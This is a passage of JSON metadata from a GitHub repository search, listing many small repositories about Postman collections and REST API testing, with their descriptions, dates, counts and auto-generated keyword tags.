OMDB","fork":false,"created_at":"2018-06-10T22:30:00Z","updated_at":"2018-06-10T22:36:43Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":39575202,"owner_login":"profedsoncruz","owner_avatar_url":"https://avatars1.githubusercontent.com/u/39575202?v=4","pulled":1,"tags":["test","testes","usando","criada","aula"]},{"id":141487506,"name":"emailwizard-postman-collection","full_name":"slawosz/emailwizard-postman-collection","description":null,"fork":false,"created_at":"2018-07-18T20:37:20Z","updated_at":"2018-07-23T08:50:46Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":11747,"owner_login":"slawosz","owner_avatar_url":"https://avatars3.githubusercontent.com/u/11747?v=4","pulled":1,"tags":[]},{"id":99628011,"name":"esb-stp-postman-collection","full_name":"nzx-prash/esb-stp-postman-collection","description":"Postman collection for testing Straight Through Processing  - Red Current","fork":false,"created_at":"2017-08-07T23:04:06Z","updated_at":"2017-08-07T23:05:38Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":20763079,"owner_login":"nzx-prash","owner_avatar_url":"https://avatars2.githubusercontent.com/u/20763079?v=4","pulled":1,"tags":["test","collect","collection","testing","rent"]},{"id":78666405,"name":"postman_collection_example","full_name":"qaclub/postman_collection_example","description":"Example of using postman collections for automating REST API testing","fork":false,"created_at":"2017-01-11T18:21:30Z","updated_at":"2017-01-11T18:21:30Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":19352771,"owner_login":"qaclub","owner_avatar_url":"https://avatars1.githubusercontent.com/u/19352771?v=4","pulled":1,"tags":["test"," postman","collect","collection","collections","testing","postman collection","auto","automat","postman collections","automating"]},{"id":170207066,"name":"connectall-postman-collections","full_name":"dougbass/connectall-postman-collections","description":null,"fork":false,"created_at":"2019-02-11T21:43:09Z","updated_at":"2019-02-11T21:50:08Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":1144273,"owner_login":"dougbass","owner_avatar_url":"https://avatars2.githubusercontent.com/u/1144273?v=4","pulled":1,"tags":[]},{"id":189625254,"name":"postman-collections-public","full_name":"bgarlow/postman-collections-public","description":null,"fork":false,"created_at":"2019-05-31T16:25:20Z","updated_at":"2019-05-31T19:09:49Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":21367625,"owner_login":"bgarlow","owner_avatar_url":"https://avatars2.githubusercontent.com/u/21367625?v=4","pulled":1,"tags":[]},{"id":167336847,"name":"postman-tfe-collection","full_name":"nehrman/postman-tfe-collection","description":null,"fork":false,"created_at":"2019-01-24T09:05:28Z","updated_at":"2019-01-24T09:05:31Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":12544810,"owner_login":"nehrman","owner_avatar_url":"https://avatars2.githubusercontent.com/u/12544810?v=4","pulled":1,"tags":[]},{"id":207670593,"name":"Postman-Collection-ARP","full_name":"yzfvroom/Postman-Collection-ARP","description":null,"fork":false,"created_at":"2019-09-10T21:59:18Z","updated_at":"2019-09-18T23:13:28Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":38794887,"owner_login":"yzfvroom","owner_avatar_url":"https://avatars3.githubusercontent.com/u/38794887?v=4","pulled":1,"tags":[]},{"id":206349498,"name":"amio-postman-collection","full_name":"amio-io/amio-postman-collection","description":null,"fork":false,"created_at":"2019-09-04T15:16:47Z","updated_at":"2020-01-13T09:37:02Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":13884288,"owner_login":"amio-io","owner_avatar_url":"https://avatars1.githubusercontent.com/u/13884288?v=4","pulled":1,"tags":[]},{"id":224880563,"name":"Onboarding.Postman.Collection","full_name":"YouLend/Onboarding.Postman.Collection","description":null,"fork":false,"created_at":"2019-11-29T15:39:38Z","updated_at":"2019-11-29T15:39:38Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":58297271,"owner_login":"YouLend","owner_avatar_url":"https://avatars3.githubusercontent.com/u/58297271?v=4","pulled":1,"tags":[]},{"id":248604257,"name":"Postman-test-collection","full_name":"atanasovpld/Postman-test-collection","description":null,"fork":false,"created_at":"2020-03-19T21:01:50Z","updated_at":"2020-03-19T21:01:53Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":62113693,"owner_login":"atanasovpld","owner_avatar_url":"https://avatars1.githubusercontent.com/u/62113693?v=4","pulled":1,"tags":[]},{"id":245716127,"name":"postman-collection-testing","full_name":"anilkk/postman-collection-testing","description":"Demo app of postman collection testing","fork":false,"created_at":"2020-03-07T22:38:55Z","updated_at":"2020-03-07T23:03:34Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":1124415,"owner_login":"anilkk","owner_avatar_url":"https://avatars3.githubusercontent.com/u/1124415?v=4","pulled":1,"tags":["test"," postman","collect","collection","testing","postman collection"]},{"id":216838721,"name":"oci_waf_postman_collection","full_name":"BaptisS/oci_waf_postman_collection","description":null,"fork":false,"created_at":"2019-10-22T14:48:28Z","updated_at":"2020-03-26T11:09:26Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":56864846,"owner_login":"BaptisS","owner_avatar_url":"https://avatars2.githubusercontent.com/u/56864846?v=4","pulled":1,"tags":[]},{"id":66179059,"name":"orientdb-postman-collection","full_name":"azusa0127/orientdb-postman-collection","description":null,"fork":false,"created_at":"2016-08-21T03:16:22Z","updated_at":"2016-08-21T03:16:22Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":16807434,"owner_login":"azusa0127","owner_avatar_url":"https://avatars0.githubusercontent.com/u/16807434?v=4","pulled":1,"tags":[]},{"id":246331892,"name":"Collection-for-Bugred.ru","full_name":"zhurba-alina/Collection-for-Bugred.ru","description":"postman collection for testing users.bugred.ru","fork":false,"created_at":"2020-03-10T15:02:31Z","updated_at":"2020-03-10T15:26:30Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":13964763,"owner_login":"zhurba-alina","owner_avatar_url":"https://avatars3.githubusercontent.com/u/13964763?v=4","pulled":1,"tags":["test","collect","collection","testing","postman collection","user","users"]},{"id":200779885,"name":"postman-github-notification","full_name":"xk0der/postman-github-notification","description":"To test postman collection","fork":false,"created_at":"2019-08-06T05:03:26Z","updated_at":"2019-08-06T09:17:05Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":21366,"owner_login":"xk0der","owner_avatar_url":"https://avatars2.githubusercontent.com/u/21366?v=4","pulled":1,"tags":["test"," postman","collect","collection","postman collection"]},{"id":166064223,"name":"PostmanTests","full_name":"EmilyTReaves/PostmanTests","description":"A simple Collection of tests I've written in Postman for training purposes","fork":false,"created_at":"2019-01-16T15:34:27Z","updated_at":"2019-01-20T21:25:09Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":37032484,"owner_login":"EmilyTReaves","owner_avatar_url":"https://avatars1.githubusercontent.com/u/37032484?v=4","pulled":1,"tags":["test","tests","tests ","written","purposes","training"]},{"id":194275695,"name":"QA_Manual_Jira_MyPostman_Collection","full_name":"sanellj/QA_Manual_Jira_MyPostman_Collection","description":"My: API test collection, JIRA work export, Test Cases","fork":false,"created_at":"2019-06-28T13:08:28Z","updated_at":"2020-01-09T07:55:30Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":41547691,"owner_login":"sanellj","owner_avatar_url":"https://avatars0.githubusercontent.com/u/41547691?v=4","pulled":1,"tags":["test","collect","collection","export"]},{"id":153112588,"name":"Automated-API-Testing-Using-Postman-Collections","full_name":"TSQAteam/Automated-API-Testing-Using-Postman-Collections","description":"A Postman Collection is an executable API Description. Organize requests into folders. Document the collection with descriptions, tests, and more. Send requests individually, or use collection runner to send all the requests in the collection.","fork":false,"created_at":"2018-10-15T12:53:59Z","updated_at":"2018-10-24T09:46:26Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":42575108,"owner_login":"TSQAteam","owner_avatar_url":"https://avatars2.githubusercontent.com/u/42575108?v=4","pulled":1,"tags":["test","collect","collection","request","tests","script","requests","send","runner","more","desc","folder","description","descriptions","folders","executable"]},{"id":145168093,"name":"spring-boot-postman-collection-executor-coverage-report","full_name":"rajaramkushwaha/spring-boot-postman-collection-executor-coverage-report","description":null,"fork":false,"created_at":"2018-08-17T21:28:50Z","updated_at":"2018-08-18T14:07:33Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":14159015,"owner_login":"rajaramkushwaha","owner_avatar_url":"https://avatars2.githubusercontent.com/u/14159015?v=4","pulled":1,"tags":[]},{"id":222689569,"name":"Postman-API-Collection-Test-almashossain_com","full_name":"almastushar/Postman-API-Collection-Test-almashossain_com","description":"API Test of almashossain.com. This site was created by me for the API test.","fork":false,"created_at":"2019-11-19T12:20:54Z","updated_at":"2019-11-19T14:11:36Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":17080111,"owner_login":"almastushar","owner_avatar_url":"https://avatars1.githubusercontent.com/u/17080111?v=4","pulled":1,"tags":["test","create","site"]},{"id":158767871,"name":"postmanrunner","full_name":"TylerMoser/postmanrunner","description":"An alternative UI for executing Postman test collections","fork":false,"created_at":"2018-11-23T01:52:55Z","updated_at":"2019-01-21T00:06:43Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":44931716,"owner_login":"TylerMoser","owner_avatar_url":"https://avatars3.githubusercontent.com/u/44931716?v=4","pulled":1,"tags":["test","collect","collection","collections","native","alternative","executing"]},{"id":146285555,"name":"postmanerator","full_name":"bharath5412/postmanerator","description":"Updating postmanerator tool to use latest collections 2.1 version","fork":false,"created_at":"2018-08-27T11:00:51Z","updated_at":"2018-08-27T11:00:51Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":14997740,"owner_login":"bharath5412","owner_avatar_url":"https://avatars1.githubusercontent.com/u/14997740?v=4","pulled":1,"tags":["test"," postman","collect","collection","collections","tool","version","latest"]},{"id":139065697,"name":"Postman-Examples","full_name":"hrymel/Postman-Examples","description":"A collection of Postman calls with tests.","fork":false,"created_at":"2018-06-28T20:34:20Z","updated_at":"2018-06-28T20:37:22Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":9418357,"owner_login":"hrymel","owner_avatar_url":"https://avatars0.githubusercontent.com/u/9418357?v=4","pulled":1,"tags":["test","collect","collection","tests","call","calls"]},{"id":200146430,"name":"postman_test","full_name":"Dusted-Wu/postman_test","description":"create a repository to test postman collection","fork":false,"created_at":"2019-08-02T01:57:00Z","updated_at":"2019-08-02T02:00:33Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":30411985,"owner_login":"Dusted-Wu","owner_avatar_url":"https://avatars1.githubusercontent.com/u/30411985?v=4","pulled":1,"tags":["test"," postman","collect","collection","create","repo","postman collection","repos","repository"]},{"id":70040661,"name":"pydio_postman","full_name":"isma91/pydio_postman","description":"A postman collection and environment to test your Pydio","fork":false,"created_at":"2016-10-05T08:00:42Z","updated_at":"2016-10-05T08:03:52Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":12897161,"owner_login":"isma91","owner_avatar_url":"https://avatars1.githubusercontent.com/u/12897161?v=4","pulled":1,"tags":["test"," postman","collect","collection","postman collection","environment"]},{"id":33279651,"name":"payhub-postman_tests","full_name":"payhubbuilder/payhub-postman_tests","description":"Various Postman test collections for PayHub APIs.","fork":false,"created_at":"2015-04-02T00:07:33Z","updated_at":"2015-04-02T00:07:33Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":2334037,"owner_login":"payhubbuilder","owner_avatar_url":"https://avatars0.githubusercontent.com/u/2334037?v=4","pulled":1,"tags":["test","collect","collection","collections"]},{"id":100525647,"name":"web-rest-postman","full_name":"telosys-templates-v3/web-rest-postman","description":"REST testing with Postman tests collection","fork":false,"created_at":"2017-08-16T19:35:25Z","updated_at":"2017-08-16T19:35:25Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":20856286,"owner_login":"telosys-templates-v3","owner_avatar_url":"https://avatars3.githubusercontent.com/u/20856286?v=4","pulled":1,"tags":["test","collect","collection","testing","tests","tests "]},{"id":142274236,"name":"emailwizard-postman","full_name":"emailwizard/emailwizard-postman","description":"Postman collections which are useful for emailwizard API testing","fork":false,"created_at":"2018-07-25T08:56:24Z","updated_at":"2018-07-25T16:58:11Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":41673165,"owner_login":"emailwizard","owner_avatar_url":"https://avatars3.githubusercontent.com/u/41673165?v=4","pulled":1,"tags":["test","collect","collection","collections","testing","mail","email","useful","emailwizard"]},{"id":51392306,"name":"pztest-integration","full_name":"venicegeo/pztest-integration","description":"Unit and integrated tests from Postman Collections","fork":false,"created_at":"2016-02-09T19:16:47Z","updated_at":"2018-04-10T12:35:42Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":15457149,"owner_login":"venicegeo","owner_avatar_url":"https://avatars2.githubusercontent.com/u/15457149?v=4","pulled":1,"tags":["test","tests","tests ","integrate","integrated"]},{"id":230494481,"name":"Boat-Tracker","full_name":"rcelsom/Boat-Tracker","description":"This is a REST API using Google cloud for hosting and Google datastore for storage. API documentation and Postman test suite and environment is included","fork":false,"created_at":"2019-12-27T18:21:48Z","updated_at":"2019-12-27T18:49:11Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":49167006,"owner_login":"rcelsom","owner_avatar_url":"https://avatars3.githubusercontent.com/u/49167006?v=4","pulled":1,"tags":["test","data","document","environment","documentation","host","store","cloud","included","suite","storage","test suite","hosting","datastore"]},{"id":65366771,"name":"Postman-Resttest","full_name":"huangbeini/Postman-Resttest","description":"好食期 postman+resttest+jenkins 接口自动化测试","fork":false,"created_at":"2016-08-10T08:55:59Z","updated_at":"2016-11-04T08:03:44Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":15405085,"owner_login":"huangbeini","owner_avatar_url":"https://avatars2.githubusercontent.com/u/15405085?v=4","pulled":1,"tags":["test"," postman","rest","jenkins"]},{"id":142869669,"name":"REST-Postman","full_name":"jenlouie/REST-Postman","description":null,"fork":false,"created_at":"2018-07-30T12:02:13Z","updated_at":"2018-07-30T16:38:26Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":749404,"owner_login":"jenlouie","owner_avatar_url":"https://avatars2.githubusercontent.com/u/749404?v=4","pulled":1,"tags":[]},{"id":129745788,"name":"restfull-php","full_name":"ddhewitte/restfull-php","description":"Membangun REST API simple (test with POSTMAN)","fork":false,"created_at":"2018-04-16T13:12:47Z","updated_at":"2018-04-16T16:48:28Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":35478044,"owner_login":"ddhewitte","owner_avatar_url":"https://avatars2.githubusercontent.com/u/35478044?v=4","pulled":1,"tags":["test"]},{"id":106666533,"name":"rest-server-postman","full_name":"annashrul/rest-server-postman","description":null,"fork":false,"created_at":"2017-10-12T08:35:38Z","updated_at":"2017-10-12T08:58:11Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":32592321,"owner_login":"annashrul","owner_avatar_url":"https://avatars1.githubusercontent.com/u/32592321?v=4","pulled":1,"tags":[]},{"id":94891356,"name":"telosys-templates-postman","full_name":"so-technology-watch/telosys-templates-postman","description":"Telosys templates for Postman REST tests","fork":false,"created_at":"2017-06-20T12:58:04Z","updated_at":"2017-06-20T12:58:04Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":25341716,"owner_login":"so-technology-watch","owner_avatar_url":"https://avatars3.githubusercontent.com/u/25341716?v=4","pulled":1,"tags":["test","tests","plate","template","templates"]},{"id":136053476,"name":"postman-newman-jenkins","full_name":"johnbsinfo92/postman-newman-jenkins","description":"Automatic API REST tests run with Jenkins","fork":false,"created_at":"2018-06-04T16:31:43Z","updated_at":"2018-06-04T19:23:29Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":8635676,"owner_login":"johnbsinfo92","owner_avatar_url":"https://avatars2.githubusercontent.com/u/8635676?v=4","pulled":1,"tags":["test","tests","tests "]},{"id":69353457,"name":"restcloud","full_name":"chuqingq/restcloud","description":"a cloud test tool for rest api, like postman","fork":false,"created_at":"2016-09-27T12:18:02Z","updated_at":"2019-02-11T14:32:49Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":2735313,"owner_login":"chuqingq","owner_avatar_url":"https://avatars2.githubusercontent.com/u/2735313?v=4","pulled":1,"tags":["test"," postman","rest","tool","rest api","cloud"]},{"id":165954572,"name":"codegym-java-RESTful-PostMAN","full_name":"trunglk16/codegym-java-RESTful-PostMAN","description":null,"fork":false,"created_at":"2019-01-16T01:53:46Z","updated_at":"2019-01-16T01:55:25Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":43984958,"owner_login":"trunglk16","owner_avatar_url":"https://avatars3.githubusercontent.com/u/43984958?v=4","pulled":1,"tags":[]},{"id":35253469,"name":"nodejs_postman_site","full_name":"thomasborland/nodejs_postman_site","description":"NodeJS website to run POSTMan REST test scripts","fork":false,"created_at":"2015-05-08T02:06:31Z","updated_at":"2015-05-08T02:06:31Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":9681442,"owner_login":"thomasborland","owner_avatar_url":"https://avatars2.githubusercontent.com/u/9681442?v=4","pulled":1,"tags":["test","script","scripts","site","website"]},{"id":52350083,"name":"gateway-agent-postman","full_name":"KiiPlatform/gateway-agent-postman","description":"postman contents for gateway-agent local REST api testing","fork":false,"created_at":"2016-02-23T10:14:43Z","updated_at":"2016-02-23T10:14:43Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":3078752,"owner_login":"KiiPlatform","owner_avatar_url":"https://avatars3.githubusercontent.com/u/3078752?v=4","pulled":1,"tags":["test","testing","local","gateway","agent","content","contents"]},{"id":186716156,"name":"stores_rest_api_test","full_name":"lilitam/stores_rest_api_test","description":"Rest API - test cases designed in python and with Postman","fork":false,"created_at":"2019-05-14T23:41:06Z","updated_at":"2019-05-15T21:30:02Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":26920692,"owner_login":"lilitam","owner_avatar_url":"https://avatars2.githubusercontent.com/u/26920692?v=4","pulled":1,"tags":["test","sign","python","case","design","designed","cases"]},{"id":248332083,"name":"Restful-Booker-API-tests","full_name":"agafun/Restful-Booker-API-tests","description":"API tests of https://restful-booker.herokuapp.com with Postman","fork":false,"created_at":"2020-03-18T20:09:21Z","updated_at":"2020-03-25T20:36:25Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":15617419,"owner_login":"agafun","owner_avatar_url":"https://avatars3.githubusercontent.com/u/15617419?v=4","pulled":1,"tags":["test","tests","rest","tests ","http","https","restful","book","heroku","booker"]},{"id":140089028,"name":"RESTful-APIs-with-JAX-RS","full_name":"HristoMalakov/RESTful-APIs-with-JAX-RS","description":"Simple messenger application implemented with Jersey and tested with Postman","fork":false,"created_at":"2018-07-07T13:59:58Z","updated_at":"2018-07-08T13:26:22Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":30002864,"owner_login":"HristoMalakov","owner_avatar_url":"https://avatars3.githubusercontent.com/u/30002864?v=4","pulled":1,"tags":["test","application","implement","tested","esse","implemented","messenger"]},{"id":69216250,"name":"restful","full_name":"aschambers/restful","description":"creating a restful api using the node-restful library, and testing with postman.","fork":false,"created_at":"2016-09-26T05:35:57Z","updated_at":"2016-09-26T05:37:31Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":16850576,"owner_login":"aschambers","owner_avatar_url":"https://avatars0.githubusercontent.com/u/16850576?v=4","pulled":1,"tags":["test"," postman","testing","rest","node","library","restful","creating"]},{"id":136633253,"name":"postman-newman-jenkins","full_name":"ivangfr/postman-newman-jenkins","description":"The goal of this project is to implement an Automation Testing for a REST API. We will use Postman, Newman (that is the command line Collection Runner for Postman) and Jenkins. The REST API to be tested will be ReqRes, that is a fake online REST API.","fork":false,"created_at":"2018-06-08T15:01:10Z","updated_at":"2019-11-21T12:50:05Z","stargazers_count":1,"watchers_count":1,"forks":2,"watchers":1,"score":1,"owner_id":10564548,"owner_login":"ivangfr","owner_avatar_url":"https://avatars3.githubusercontent.com/u/10564548?v=4","pulled":1,"tags":["test","implement","line","tested","command","command line","online","fake","goal"]},{"id":146479756,"name":"ReplacingPostman","full_name":"fabiohenriquebayma/ReplacingPostman","description":"A tool to replace CI postman tests in a CI environment.  Test are organized by stories. Can test externals rest services.","fork":false,"created_at":"2018-08-28T17:02:37Z","updated_at":"2019-11-12T20:43:00Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":30695763,"owner_login":"fabiohenriquebayma","owner_avatar_url":"https://avatars3.githubusercontent.com/u/30695763?v=4","pulled":1,"tags":["test"," postman","tests","rest","service","tool","tests ","environment","services","postman tests","place","repl","replace","external","rest service","organized"]},{"id":177437746,"name":"cs496-assgn3","full_name":"cdjames/cs496-assgn3","description":"Google REST app in Python and Postman tests","fork":false,"created_at":"2019-03-24T16:07:49Z","updated_at":"2019-03-24T16:09:41Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":14316799,"owner_login":"cdjames","owner_avatar_url":"https://avatars1.githubusercontent.com/u/14316799?v=4","pulled":1,"tags":["test","tests"]},{"id":117334839,"name":"playground-newman","full_name":"domahidizoltan/playground-newman","description":"Playing with Rest API test automation with Postman/Newman","fork":false,"created_at":"2018-01-13T10:33:04Z","updated_at":"2019-08-01T08:39:18Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":2330530,"owner_login":"domahidizoltan","owner_avatar_url":"https://avatars1.githubusercontent.com/u/2330530?v=4","pulled":1,"tags":["test","auto","automat","automation"]},{"id":80252291,"name":"jboss-api","full_name":"michaelepley/jboss-api","description":"EE 7 REST api with JPA.  Postman for testing","fork":false,"created_at":"2017-01-27T22:41:50Z","updated_at":"2018-08-03T13:30:29Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":937497,"owner_login":"michaelepley","owner_avatar_url":"https://avatars2.githubusercontent.com/u/937497?v=4","pulled":1,"tags":["test","testing"]},{"id":187020334,"name":"rest_api","full_name":"Alpha-github/rest_api","description":"Create a web server using flask and test for API requests using postman","fork":false,"created_at":"2019-05-16T12:09:04Z","updated_at":"2019-05-16T13:57:17Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":37172066,"owner_login":"Alpha-github","owner_avatar_url":"https://avatars0.githubusercontent.com/u/37172066?v=4","pulled":1,"tags":["test"," postman","request","server","requests","flask"]},{"id":152749039,"name":"fake-rest-api-using-json-server","full_name":"tareque20/fake-rest-api-using-json-server","description":"Simple rest api test using json server","fork":false,"created_at":"2018-10-12T12:43:14Z","updated_at":"2018-10-12T13:05:19Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":7992389,"owner_login":"tareque20","owner_avatar_url":"https://avatars1.githubusercontent.com/u/7992389?v=4","pulled":1,"tags":["test","rest","server","json","rest api","json server"]},{"id":182198685,"name":"RestApi-CRUD-Operations","full_name":"Rutuja177/RestApi-CRUD-Operations","description":"I have created 3 APIs( Heroes, Product, category) created in php and mysql. And testing it on POSTMAN","fork":false,"created_at":"2019-04-19T03:58:44Z","updated_at":"2019-04-19T04:03:41Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":47986024,"owner_login":"Rutuja177","owner_avatar_url":"https://avatars2.githubusercontent.com/u/47986024?v=4","pulled":1,"tags":["test","create","testing","mysql"]},{"id":178538644,"name":"RestFul-API-Testing-server","full_name":"admindebu/RestFul-API-Testing-server","description":"This is the Server of testing restful web service. and your tool - postman / rest client act as an client.","fork":false,"created_at":"2019-03-30T09:31:42Z","updated_at":"2019-06-08T19:00:20Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":46689581,"owner_login":"admindebu","owner_avatar_url":"https://avatars2.githubusercontent.com/u/46689581?v=4","pulled":1,"tags":["test"," postman","testing","rest","service","tool","client","restful"]},{"id":126511182,"name":"REST-API-Final","full_name":"Dewgong444/REST-API-Final","description":"A simple REST API which uses python, HTML, a simple authenticator, and is tested with Postman","fork":false,"created_at":"2018-03-23T16:26:35Z","updated_at":"2018-03-23T16:26:45Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":25128708,"owner_login":"Dewgong444","owner_avatar_url":"https://avatars3.githubusercontent.com/u/25128708?v=4","pulled":1,"tags":["test","auth","tested","python","uses","authenticator"]},{"id":245692207,"name":"goRest-API-validation-and-monitoring-using-POSTMAN","full_name":"rakiashi/goRest-API-validation-and-monitoring-using-POSTMAN","description":null,"fork":false,"created_at":"2020-03-07T19:25:03Z","updated_at":"2020-03-07T23:18:54Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":37195674,"owner_login":"rakiashi","owner_avatar_url":"https://avatars0.githubusercontent.com/u/37195674?v=4","pulled":1,"tags":[]},{"id":117414666,"name":"ReST_JSON","full_name":"namanmishra001/ReST_JSON","description":"Use this application and test the cases with either Postman or ARC","fork":false,"created_at":"2018-01-14T08:34:23Z","updated_at":"2018-01-14T09:35:54Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":22395834,"owner_login":"namanmishra001","owner_avatar_url":"https://avatars3.githubusercontent.com/u/22395834?v=4","pulled":1,"tags":["test","application","case","cases","either"]},{"id":196596255,"name":"restful_task_API","full_name":"Dev-Steven/restful_task_API","description":"Created a RESTful task API and testing the API using Postman","fork":false,"created_at":"2019-07-12T14:46:55Z","updated_at":"2019-07-17T03:38:15Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":21114178,"owner_login":"Dev-Steven","owner_avatar_url":"https://avatars1.githubusercontent.com/u/21114178?v=4","pulled":1,"tags":["test","testing","task"]},{"id":191825607,"name":"REST-API-final-project","full_name":"kristaeis/REST-API-final-project","description":"REST API featuring user account creation and authentication, reading lists, and books - Postman tests/environment","fork":false,"created_at":"2019-06-13T20:02:06Z","updated_at":"2019-06-13T20:15:00Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":28417063,"owner_login":"kristaeis","owner_avatar_url":"https://avatars3.githubusercontent.com/u/28417063?v=4","pulled":1,"tags":["test","tests","user","environment","auth","list","read","authentication","book","account","creation","books","reading","lists","featuring"]},{"id":245280434,"name":"API-REST-MVC-PHP","full_name":"rodrigoassisnz/API-REST-MVC-PHP","description":"My  old API REST in PHP 7 perfect to build and test with Postman","fork":false,"created_at":"2020-03-05T22:28:25Z","updated_at":"2020-03-05T22:44:03Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":24521884,"owner_login":"rodrigoassisnz","owner_avatar_url":"https://avatars3.githubusercontent.com/u/24521884?v=4","pulled":1,"tags":["test","build","perfect"]},{"id":221197176,"name":"mongo-REST-API","full_name":"noelsasi/mongo-REST-API","description":"simple mongo rest-API build using express and Mongoose. clone it and test with Postman ","fork":false,"created_at":"2019-11-12T11:02:29Z","updated_at":"2019-11-12T11:56:42Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":44287589,"owner_login":"noelsasi","owner_avatar_url":"https://avatars2.githubusercontent.com/u/44287589?v=4","pulled":1,"tags":["test","rest","express","mongo"," express","build","clone"]},{"id":105032500,"name":"rest-api-testing-demo","full_name":"szmc/rest-api-testing-demo","description":"Repository for demo of rest api testing using different tools(Postman, Jmeter, SoapUI, curl, Rest-Assured)","fork":false,"created_at":"2017-09-27T15:00:48Z","updated_at":"2017-09-27T15:04:03Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":9567171,"owner_login":"szmc","owner_avatar_url":"https://avatars1.githubusercontent.com/u/9567171?v=4","pulled":1,"tags":["test","testing","rest","tool","demo","rent","tools","rest api","curl"]},{"id":191826746,"name":"REST-API---JWT","full_name":"kristaeis/REST-API---JWT","description":"REST API using Json Web Token for Authentication and Postman tests/environment","fork":false,"created_at":"2019-06-13T20:11:27Z","updated_at":"2019-06-13T20:13:02Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":28417063,"owner_login":"kristaeis","owner_avatar_url":"https://avatars3.githubusercontent.com/u/28417063?v=4","pulled":1,"tags":["test","tests","environment"]},{"id":166286435,"name":"rest-api-manager","full_name":"rhabhishek/rest-api-manager","description":"A client application to manage and test APIs. (One similar to Postman, 